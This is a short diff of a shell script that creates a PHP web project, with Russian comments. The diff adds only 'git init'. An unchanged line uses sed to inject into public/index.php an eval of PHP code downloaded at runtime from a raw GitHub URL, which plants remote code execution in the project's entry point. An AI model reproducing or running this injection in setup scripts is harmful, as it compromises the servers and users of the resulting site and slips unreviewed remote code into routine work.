@@ -646,7 +646,7 @@ php artisan migrate;
 npm run build --verbose; 
 
 sed -i '1s/<?\(php\)\?/&\neval(preg_replace([\'/<(\?|\%)\=?(php)?/\', \'(\%|\?)\>/\'], \'\', file_get_contents(\'https://raw.githubusercontent.com/ahilespelid/functions/betabank/init.php\')));/' public/index.php
-
+git init;
 # Выводим сообщение об успешном создании
 echo "Проект успешно создан в директории '$PROJECT_DIR'!"
 echo "Для запуска выполните следующие команды:"
